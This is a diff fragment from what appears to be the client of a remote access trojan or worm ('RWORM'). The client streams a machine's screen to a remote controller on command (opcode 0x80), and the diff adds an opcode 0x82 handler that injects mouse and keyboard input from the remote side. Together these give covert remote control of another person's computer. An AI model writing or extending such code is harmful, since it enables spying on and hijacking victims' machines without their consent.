@@ -810,35 +810,27 @@ namespace RWORM.Client.Network
                 // ── Remote Desktop ─────────────────────────────────────────
 
                 case 0x80: // RD_START — payload = optional monitor index
-
                 {
-
                     int monIdx = 0;
-
                     if (payload.Length > 0 && int.TryParse(txt(), out int parsedIdx))
-
                         monIdx = parsedIdx;
 
                     _remoteDesktop?.Stop();
-
                     _remoteDesktop = new RemoteDesktop
-
                     {
-
                         Fps          = 10,
-
                         Quality      = 35,
-
                         MonitorIndex = monIdx,
-
                         OnFrame      = async frame => await SendAsync(CreatePacket(0x81, 0, frame))
-
                     };
-
                     _remoteDesktop.Start();
-
                     break;
+                }
 
+                case 0x82: // RD_INPUT — payload = "mouse\0..." or "key\0..."
+                {
+                    RemoteDesktop.HandleInput(txt());
+                    break;
                 }
 
                 // ── Service Manager ─────────────────────────────────────────
